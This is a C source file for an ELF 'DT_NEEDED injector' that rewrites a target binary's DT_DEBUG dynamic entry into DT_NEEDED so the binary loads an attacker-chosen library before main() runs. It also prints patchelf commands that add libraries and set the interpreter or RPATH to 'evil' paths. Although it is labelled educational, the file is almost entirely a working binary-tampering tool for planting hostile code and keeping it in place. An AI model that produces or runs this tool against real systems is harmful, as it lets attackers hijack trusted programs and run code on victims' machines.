/*
 * dt_needed_injector.c - DT_NEEDED Entry Injector
 *
 * This tool demonstrates DT_NEEDED injection by:
 *   1. Finding an existing DT_NULL or convertible entry
 *   2. Converting it to DT_NEEDED
 *   3. Pointing it to a library name in .dynstr
 *
 * TECHNIQUE: We hijack the DT_DEBUG entry (which is only used by debuggers)
 * and convert it to DT_NEEDED pointing to our malicious library.
 *
 * For the library name, we either:
 *   a) Use an existing string in .dynstr (limited)
 *   b) Overwrite an unused string (careful!)
 *   c) Use a short name that fits in padding
 *
 * Compile: gcc -o dt_needed_injector dt_needed_injector.c
 *
 * EDUCATIONAL PURPOSES ONLY
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <elf.h>

/* Color codes */
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

/* ═══════════════════════════════════════════════════════════════════════════
 * HELPER FUNCTIONS
 * ═══════════════════════════════════════════════════════════════════════════ */

void print_banner(void) {
    printf("\n");
    printf(RED "╔════════════════════════════════════════════════════════════════════╗\n" RESET);
    printf(RED "║" YELLOW "                 DT_NEEDED INJECTOR                                " RED "║\n" RESET);
    printf(RED "║" RESET "                                                                    " RED "║\n" RESET);
    printf(RED "║" RESET "  Injects a DT_NEEDED entry to load a malicious library            " RED "║\n" RESET);
    printf(RED "║" RESET "  The library will be loaded BEFORE main() runs!                   " RED "║\n" RESET);
    printf(RED "╚════════════════════════════════════════════════════════════════════╝\n" RESET);
    printf("\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * INJECTION TECHNIQUE 1: Hijack DT_DEBUG
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * DT_DEBUG is set by the linker at runtime to point to r_debug structure.
 * It's only useful for debuggers. We can convert it to DT_NEEDED.
 *
 * Limitation: Need library name already in .dynstr, OR we need to find space.
 */

int find_string_in_dynstr(void *map, Elf64_Ehdr *ehdr, const char *target, size_t *offset) {
    Elf64_Phdr *phdr = (Elf64_Phdr *)((char *)map + ehdr->e_phoff);
    Elf64_Dyn *dynamic = NULL;

    /* Find dynamic section */
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_DYNAMIC) {
            dynamic = (Elf64_Dyn *)((char *)map + phdr[i].p_offset);
            break;
        }
    }

    if (!dynamic) return -1;

    /* Find strtab */
    char *strtab = NULL;
    size_t strtab_size = 0;
    size_t strtab_file_offset = 0;

    for (Elf64_Dyn *dyn = dynamic; dyn->d_tag != DT_NULL; dyn++) {
        if (dyn->d_tag == DT_STRTAB) {
            for (int i = 0; i < ehdr->e_phnum; i++) {
                if (phdr[i].p_type == PT_LOAD &&
                    dyn->d_un.d_ptr >= phdr[i].p_vaddr &&
                    dyn->d_un.d_ptr < phdr[i].p_vaddr + phdr[i].p_filesz) {
                    strtab_file_offset = dyn->d_un.d_ptr - phdr[i].p_vaddr + phdr[i].p_offset;
                    strtab = (char *)map + strtab_file_offset;
                    break;
                }
            }
        }
        if (dyn->d_tag == DT_STRSZ) {
            strtab_size = dyn->d_un.d_val;
        }
    }

    if (!strtab) return -1;

    /* Search for target string */
    for (size_t i = 0; i < strtab_size; i++) {
        if (strcmp(strtab + i, target) == 0) {
            *offset = i;
            return 0;
        }
    }

    return -1;  /* Not found */
}

int inject_dt_needed_via_debug(const char *filename, const char *libname) {
    printf(CYAN "═══════════════════════════════════════════════════════════════════\n" RESET);
    printf(CYAN "  INJECTION METHOD: DT_DEBUG Hijacking\n" RESET);
    printf(CYAN "═══════════════════════════════════════════════════════════════════\n" RESET);
    printf("\n");

    printf("  Target: " GREEN "%s" RESET "\n", filename);
    printf("  Library to inject: " RED "%s" RESET "\n\n", libname);

    /* Open file read-write */
    int fd = open(filename, O_RDWR);
    if (fd < 0) {
        perror("  open");
        return -1;
    }

    struct stat st;
    if (fstat(fd, &st) < 0) {
        perror("  fstat");
        close(fd);
        return -1;
    }

    void *map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) {
        perror("  mmap");
        close(fd);
        return -1;
    }

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)map;

    /* Verify ELF */
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, RED "  [!] Not an ELF file\n" RESET);
        munmap(map, st.st_size);
        close(fd);
        return -1;
    }

    /* Find dynamic section */
    Elf64_Phdr *phdr = (Elf64_Phdr *)((char *)map + ehdr->e_phoff);
    Elf64_Dyn *dynamic = NULL;

    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_DYNAMIC) {
            dynamic = (Elf64_Dyn *)((char *)map + phdr[i].p_offset);
            break;
        }
    }

    if (!dynamic) {
        fprintf(stderr, RED "  [!] No dynamic section found\n" RESET);
        munmap(map, st.st_size);
        close(fd);
        return -1;
    }

    /* First, check if library name exists in .dynstr */
    size_t str_offset;
    if (find_string_in_dynstr(map, ehdr, libname, &str_offset) < 0) {
        fprintf(stderr, YELLOW "  [!] Library name '%s' not found in .dynstr\n" RESET, libname);
        fprintf(stderr, "      This method requires the string to already exist.\n");
        fprintf(stderr, "      Use patchelf for full injection capability.\n\n");
        munmap(map, st.st_size);
        close(fd);
        return -1;
    }

    printf("  [+] Found library name at .dynstr offset: " GREEN "0x%zx" RESET "\n", str_offset);

    /* Find DT_DEBUG entry to hijack */
    Elf64_Dyn *dt_debug = NULL;
    for (Elf64_Dyn *dyn = dynamic; dyn->d_tag != DT_NULL; dyn++) {
        if (dyn->d_tag == DT_DEBUG) {
            dt_debug = dyn;
            break;
        }
    }

    if (!dt_debug) {
        fprintf(stderr, YELLOW "  [!] No DT_DEBUG entry found to hijack\n" RESET);
        munmap(map, st.st_size);
        close(fd);
        return -1;
    }

    printf("  [+] Found DT_DEBUG entry to hijack\n");

    /* Perform the injection */
    printf("\n  " YELLOW "Performing injection..." RESET "\n");
    printf("    Before: d_tag = DT_DEBUG (%d)\n", DT_DEBUG);

    dt_debug->d_tag = DT_NEEDED;
    dt_debug->d_un.d_val = str_offset;

    printf("    After:  d_tag = DT_NEEDED (%d), d_val = 0x%zx\n", DT_NEEDED, str_offset);

    /* Sync changes */
    if (msync(map, st.st_size, MS_SYNC) < 0) {
        perror("  msync");
    }

    munmap(map, st.st_size);
    close(fd);

    printf("\n  " GREEN "[✓] Injection successful!" RESET "\n");
    printf("      The binary will now load '%s' at startup.\n\n", libname);

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * INJECTION TECHNIQUE 2: Use patchelf (recommended)
 * ═══════════════════════════════════════════════════════════════════════════ */

void show_patchelf_method(const char *filename, const char *libname) {
    printf(CYAN "═══════════════════════════════════════════════════════════════════\n" RESET);
    printf(CYAN "  RECOMMENDED METHOD: Using patchelf\n" RESET);
    printf(CYAN "═══════════════════════════════════════════════════════════════════\n" RESET);
    printf("\n");

    printf("  patchelf can add DT_NEEDED entries cleanly:\n\n");

    printf("  " YELLOW "# Add a new DT_NEEDED entry:\n" RESET);
    printf("  patchelf --add-needed %s %s\n\n", libname, filename);

    printf("  " YELLOW "# Remove a DT_NEEDED entry:\n" RESET);
    printf("  patchelf --remove-needed <libname> %s\n\n", filename);

    printf("  " YELLOW "# Replace a DT_NEEDED entry:\n" RESET);
    printf("  patchelf --replace-needed <old> <new> %s\n\n", filename);

    printf("  " YELLOW "# Set the interpreter (PT_INTERP):\n" RESET);
    printf("  patchelf --set-interpreter /path/to/evil/ld.so %s\n\n", filename);

    printf("  " YELLOW "# Set RPATH:\n" RESET);
    printf("  patchelf --set-rpath /path/to/evil/libs %s\n\n", filename);
}

/* ═══════════════════════════════════════════════════════════════════════════
 * MAIN
 * ═══════════════════════════════════════════════════════════════════════════ */

int main(int argc, char *argv[]) {
    print_banner();

    if (argc < 3) {
        printf("  " YELLOW "Usage:" RESET " %s <target-binary> <library-to-inject>\n\n", argv[0]);
        printf("  " YELLOW "Example:" RESET "\n");
        printf("    %s ./victim libevil.so\n\n", argv[0]);

        printf("  " YELLOW "This tool demonstrates two injection methods:" RESET "\n");
        printf("    1. DT_DEBUG hijacking (limited, string must exist)\n");
        printf("    2. patchelf usage (recommended, full capability)\n\n");

        show_patchelf_method("<binary>", "<library.so>");
        return 1;
    }

    const char *target = argv[1];
    const char *libname = argv[2];

    /* Try DT_DEBUG hijacking first */
    if (inject_dt_needed_via_debug(target, libname) < 0) {
        printf("\n");
        show_patchelf_method(target, libname);
    }

    printf(GREEN "[✓] Injector complete.\n" RESET);
    printf("\n");

    return 0;
}
